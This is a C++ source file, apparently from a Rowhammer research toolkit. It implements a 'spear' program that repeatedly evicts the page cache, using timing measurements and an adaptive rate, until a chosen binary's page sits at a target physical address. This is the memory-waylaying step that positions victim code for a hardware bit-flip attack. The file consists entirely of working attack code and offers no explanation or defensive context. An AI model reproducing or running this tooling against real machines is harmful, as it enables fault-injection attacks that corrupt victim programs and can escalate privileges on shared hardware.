#include "libhammer.h"
#include "time.h"
#include "math.h"

using namespace std;

uint64_t target_pa, mem_size, target_offset = 0;
char *memfile, *target;
int fd;
double rate = 0.99, delta = 0.05;

uint64_t access_time(uint64_t off)
{
    myclock clk;
    volatile int x=0;

    START_TSC(clk);
    x += memfile[off];
    END_TSC(clk);

    return clk.ticks;
}

void alloc()
{
    mem_size = get_mem_size();
    cout << "- mem size: " << dec << (mem_size/1024000) << " M" << endl;

    ASSERT(-1 != (fd = open("memfile", O_RDONLY)) );
    memfile = mmap(0, mem_size, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0);
}

void initial_access()
{
    volatile uint64_t tmp = 0;
    uint64_t i=0, pa;

    cout << "initial access..." << endl;
    for (i=0; i<mem_size; i+=PAGE_SIZE)
    {
        tmp += memfile[i];

        if (i>0 && i % (1<<24)==0) { cout << "."; cout.flush(); }
        //if (i>0 && i % (100<<20)==0) { cout << dec << (i>>20) << "M, pa=" << hex << v2p(memfile+i) << endl;}
        if (i>0 && i % (1<<30)==0) cout << dec <<(i>>30) << "G" << endl;
        /*
        pa = v2p(memfile+i);
        if (pa == target_pa)
        {
            target_offset = i;
            cout << endl << hex << "- find va=" << (uint64_t)(memfile+i) << " pa=" << pa << endl;
            // 1. mlock() target page
            mlock(memfile+i, PAGE_SIZE);
        }
        */
    }
    cout << endl;
}

uint64_t evict_access()
{
    uint64_t cached_mem = (uint64_t)((double)get_cached_mem() * rate);
    //uint64_t extra_mem = (uint64_t)((double)get_cached_mem() * 0.03);
    uint64_t i, st, cached_count = 0, uncached_count = 0;
    volatile uint64_t tmp=0;
    myclock clk, cl;

    st = (mem_size - cached_mem) & ~0xfffull;
    cout << "- cached space: " << dec << (cached_mem/1024000) << "M" << endl;
    // << ", extra space (eviction): " << (extra_mem/1024000) << "M, start offset=" << st << endl;

    START_CLOCK(clk, CLOCK_MONOTONIC);
    // 1. visit cached space. very fast but cannot evict others
    for (i=st; i<mem_size; i+=PAGE_SIZE)
    {
        START_TSC(cl);
        tmp += memfile[i];
        END_TSC(cl);
        if (cl.ticks < 8000)
            ++cached_count;
        else
            ++uncached_count;

        if (i>0 && i % (1<<24)==0)
        {
            if (cl.ticks < 2000)
                cout << "-";
            else if (cl.ticks < 8000)
                cout << ".";
            else
                cout << "+";
            cout.flush();
        }
        if (i>0 && i % 1024000000ull==0) cout << dec <<(i/1024000000ull) << "G" << endl;
    }
    // 2. visit un-cached space. slow (for swapping) but can evict target page cache
/*
    for (i=0; i<extra_mem; i+=PAGE_SIZE)
    {
        START_TSC(cl);
        tmp += memfile[i];
        END_TSC(cl);
        if (cl.ticks < 8000)
            ++cached_count;
        else
            ++uncached_count;
        if (i>0 && i % (1<<24)==0) { cout << "+"; cout.flush(); }
        if (i>0 && i % (1<<30)==0) cout << dec <<(i>>30) << "G" << endl;
    }
*/
    END_CLOCK(clk);

    cout << endl << "- cached: " << dec << ((uint64_t)((double)cached_count / (cached_count + uncached_count-1) * 1000) / 10.0d) << "%" << endl;
    return clk.ns;
}

void cleanup()
{
    cout << "- cleanup..." << endl;
    close(fd);
    if (memfile)
    {
        munmap(memfile, mem_size); memfile = 0;
    }
    if (target)
    {
        munmap(target, PAGE_SIZE); target = 0;
    }
}

int main(int argc, char **argv)
{
    int step = 0;
    uint64_t pa = 0, last_pa = 0, t;

    if (argc < 3)
    {
        cout << "usage: spear [path] [paddr]" << endl;
        return 0;
    }

    string fname(argv[1]);
    stringstream ss;
    ss << hex << argv[2]; ss >> target_pa;
   // cout << "CHILD_MAX = " << sysconf(_SC_CHILD_MAX) << endl;
    cout << "path: " << fname << ", pa=" << hex << get_binary_pa(fname) << " target paddr=" << target_pa << endl;

    // equivalent to waylaying
    alloc();
    initial_access();
    while (pa != target_pa)
    {
        t = evict_access();
        pa = get_binary_pa(fname);
        cout << "- step " << ++step << ": " << dec << (t/1000000) << " ms, rate = " << rate << ", pa = " << hex << pa << endl;

        // adaptive
        if (delta > 0.0001 && pa != last_pa)
            rate -= delta;
        else
            rate += delta;
        if (delta > 0.0001) delta /= 2.0;
        last_pa = pa;

    }

    cout << "---" << endl;
    cout << "path: " << fname << ", pa=" << hex << get_binary_pa(fname) << " target paddr=" << target_pa << endl;

    cleanup();

    return 0;
}
